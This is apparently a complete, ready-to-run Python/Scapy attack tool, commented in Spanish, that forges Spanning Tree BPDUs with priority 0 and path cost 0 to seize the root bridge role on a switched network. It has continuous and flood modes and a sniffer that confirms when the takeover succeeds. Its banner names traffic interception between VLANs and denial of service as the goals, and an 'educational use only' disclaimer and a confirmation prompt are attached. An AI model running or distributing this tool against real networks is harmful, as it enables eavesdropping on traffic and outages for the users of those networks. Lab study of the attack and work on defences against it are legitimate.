#!/usr/bin/env python3

from scapy.all import *
import argparse
import sys
import os
import time

class STPRootBridgeAttack:
    def __init__(self, interface, bridge_priority=0, hello_time=2, max_age=20, forward_delay=15):
        self.interface = interface
        self.bridge_priority = bridge_priority
        self.hello_time = hello_time
        self.max_age = max_age
        self.forward_delay = forward_delay
        
        # Obtener MAC de la interfaz
        self.attacker_mac = get_if_hwaddr(interface)
        
        # MAC multicast para BPDU (Bridge Protocol Data Unit)
        self.stp_multicast = "01:80:c2:00:00:00"
        
        # Bridge ID del atacante (Priority + MAC)
        self.bridge_id = self.create_bridge_id(bridge_priority, self.attacker_mac)
        
        print("\n" + "="*70)
        print("STP CLAIM ROOT BRIDGE ATTACK")
        print("="*70)
        print(f"[*] Interfaz: {self.interface}")
        print(f"[*] MAC Atacante: {self.attacker_mac}")
        print(f"[*] Bridge Priority: {self.bridge_priority}")
        print(f"[*] Bridge ID: {self.bridge_id.hex()}")
        print(f"[*] Hello Time: {self.hello_time}s")
        print(f"[*] Max Age: {self.max_age}s")
        print(f"[*] Forward Delay: {self.forward_delay}s")
        print("="*70 + "\n")
    
    def create_bridge_id(self, priority, mac):
        """Crea el Bridge ID (2 bytes priority + 6 bytes MAC)"""
        priority_bytes = priority.to_bytes(2, byteorder='big')
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        return priority_bytes + mac_bytes
    
    def create_bpdu(self):
        """Crea un BPDU (Bridge Protocol Data Unit) malicioso"""
        
        # Ethernet frame
        eth = Ether(src=self.attacker_mac, dst=self.stp_multicast)
        
        # LLC (Logical Link Control) - necesario para STP
        llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        
        # STP BPDU
        # Reclama ser el Root Bridge con la prioridad más baja
        stp = STP(
            proto=0,                    # Protocol ID
            version=0,                  # Version (STP clásico)
            bpdutype=0,                 # Configuration BPDU
            bpduflags=0x01,             # Topology Change ACK
            rootid=self.bridge_priority,           # Root Bridge Priority
            rootmac=self.attacker_mac,             # Root Bridge MAC
            pathcost=0,                            # Path cost (0 = soy el root)
            bridgeid=self.bridge_priority,         # Bridge ID Priority
            bridgemac=self.attacker_mac,           # Bridge MAC
            portid=0x8001,                         # Port ID
            age=0,                                 # Message Age
            maxage=self.max_age,                   # Max Age
            hellotime=self.hello_time,             # Hello Time
            fwddelay=self.forward_delay            # Forward Delay
        )
        
        # Construir paquete completo
        packet = eth / llc / stp
        
        return packet
    
    def send_malicious_bpdu(self):
        """Envía BPDUs maliciosos continuamente"""
        bpdu = self.create_bpdu()
        
        print(f"[+] Enviando BPDU malicioso...")
        print(f"    Root Bridge ID: Priority {self.bridge_priority}, MAC {self.attacker_mac}")
        print(f"    Path Cost: 0 (claiming to be root)")
        
        sendp(bpdu, iface=self.interface, verbose=0)
    
    def monitor_stp(self, packet):
        """Monitorea BPDUs en la red"""
        if STP in packet:
            root_mac = packet[STP].rootmac
            root_priority = packet[STP].rootid
            bridge_mac = packet[STP].bridgemac
            bridge_priority = packet[STP].bridgeid
            path_cost = packet[STP].pathcost
            
            print(f"\n[>>] BPDU detectado:")
            print(f"    Root: Priority {root_priority}, MAC {root_mac}")
            print(f"    Bridge: Priority {bridge_priority}, MAC {bridge_mac}")
            print(f"    Path Cost: {path_cost}")
            
            # Verificar si somos el root
            if root_mac.lower() == self.attacker_mac.lower():
                print(f"[+] ¡EXITO! Somos reconocidos como Root Bridge")
    
    def start_attack(self, duration=60, interval=2):
        """Inicia el ataque STP"""
        print(f"[*] Iniciando ataque STP Claim Root Bridge")
        print(f"[*] Duracion: {duration}s")
        print(f"[*] Intervalo entre BPDUs: {interval}s")
        print(f"[*] Presiona Ctrl+C para detener\n")
        
        # Iniciar sniffer en segundo plano para monitorear STP
        sniffer = AsyncSniffer(
            iface=self.interface,
            filter="ether dst 01:80:c2:00:00:00",
            prn=self.monitor_stp,
            store=0
        )
        sniffer.start()
        
        start_time = time.time()
        count = 0
        
        try:
            while time.time() - start_time < duration:
                self.send_malicious_bpdu()
                count += 1
                print(f"[*] BPDUs enviados: {count}")
                time.sleep(interval)
        
        except KeyboardInterrupt:
            print("\n\n[!] Ataque detenido por el usuario")
        
        finally:
            sniffer.stop()
            elapsed = time.time() - start_time
            
            print("\n" + "="*70)
            print("ESTADISTICAS DEL ATAQUE")
            print("="*70)
            print(f"Tiempo transcurrido: {elapsed:.2f}s")
            print(f"BPDUs enviados: {count}")
            print(f"Tasa: {count/elapsed:.2f} BPDUs/s")
            print("="*70)
    
    def flood_attack(self, count=100, interval=0.5):
        """Ataque agresivo con flood de BPDUs"""
        print(f"[*] MODO FLOOD - Enviando {count} BPDUs rapidos")
        print(f"[*] Intervalo: {interval}s\n")
        
        bpdu = self.create_bpdu()
        
        for i in range(count):
            sendp(bpdu, iface=self.interface, verbose=0)
            print(f"[{i+1}/{count}] BPDU enviado")
            time.sleep(interval)
        
        print(f"\n[+] Flood completado: {count} BPDUs enviados")

def main():
    banner = """
    ======================================================================
              STP CLAIM ROOT BRIDGE ATTACK - SCAPY
              USO EXCLUSIVO EDUCATIVO
    ======================================================================
    
    Este ataque:
    - Envia BPDUs (Bridge Protocol Data Units) maliciosos
    - Reclama ser el Root Bridge de la red con prioridad 0
    - Puede causar reconvergencia STP y loops
    - Permite Man-in-the-Middle interceptando trafico entre VLANs
    - Puede causar Denial of Service en la red
    
    PELIGRO: Este ataque puede interrumpir completamente la red
    
    ======================================================================
    """
    print(banner)
    
    parser = argparse.ArgumentParser(description='STP Claim Root Bridge Attack')
    parser.add_argument('-i', '--interface', required=True, 
                       help='Interfaz de red (ej: eth0)')
    parser.add_argument('-p', '--priority', type=int, default=0,
                       help='Bridge Priority (default: 0 = maxima prioridad)')
    parser.add_argument('-m', '--mode', choices=['continuous', 'flood'], 
                       default='continuous',
                       help='Modo: continuous (normal) o flood (agresivo)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duracion en segundos (modo continuous)')
    parser.add_argument('-c', '--count', type=int, default=100,
                       help='Numero de BPDUs (modo flood)')
    parser.add_argument('-t', '--interval', type=float, default=2.0,
                       help='Intervalo entre BPDUs en segundos')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] ERROR: Este script requiere privilegios root")
        print("[!] Ejecuta: sudo python3 stp-attack.py -i eth0")
        sys.exit(1)
    
    print("[!] ADVERTENCIA: Este ataque puede causar interrupcion total de la red")
    print("[!] Solo para fines educativos en laboratorios propios")
    print("[!] El uso no autorizado es ILEGAL\n")
    
    response = input("Continuar? (yes/no): ")
    if response.lower() != 'yes':
        print("[*] Ataque cancelado")
        sys.exit(0)
    
    try:
        attacker = STPRootBridgeAttack(
            interface=args.interface,
            bridge_priority=args.priority,
            hello_time=2,
            max_age=20,
            forward_delay=15
        )
        
        if args.mode == 'continuous':
            attacker.start_attack(duration=args.duration, interval=args.interval)
        else:
            attacker.flood_attack(count=args.count, interval=args.interval)
    
    except KeyboardInterrupt:
        print("\n[!] Interrumpido")
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
